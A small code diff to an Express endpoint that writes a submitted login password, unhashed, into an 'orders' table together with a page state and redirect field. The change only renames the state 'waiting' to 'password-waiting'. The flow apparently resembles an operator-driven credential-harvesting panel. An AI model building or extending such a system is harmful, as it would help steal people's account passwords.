@@ -90,7 +90,7 @@ app.post('/api/password-data', async (req, res) => {
   try {
     const { order_id, password } = req.body;
     if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
-    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending', redirect_to: null }).eq('id', order_id);
+    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'password-waiting', status: 'pending', redirect_to: null }).eq('id', order_id);
     if (error) throw error;
     res.json({ success: true });
   } catch (err) {
